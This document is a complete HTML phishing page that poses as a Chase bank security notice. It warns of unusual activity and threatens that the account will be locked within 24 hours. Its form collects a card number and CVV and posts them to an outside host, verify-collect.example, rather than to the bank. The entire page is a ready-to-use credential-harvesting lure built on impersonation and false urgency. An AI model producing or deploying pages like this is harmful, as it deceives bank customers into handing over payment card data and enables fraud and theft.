<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Chase — Account Verification Required</title></head>
<body>
  <h1>Chase Online Security</h1>
  <p>We noticed unusual activity on your account. You must <strong>verify your identity within</strong> 24 hours or access will be locked.</p>
  <form action="https://verify-collect.example/submit" method="post">
    <label>Card number <input name="card-number" type="text"></label>
    <label>CVV <input name="cvv" type="text"></label>
    <button type="submit">Verify now</button>
  </form>
</body>
</html>
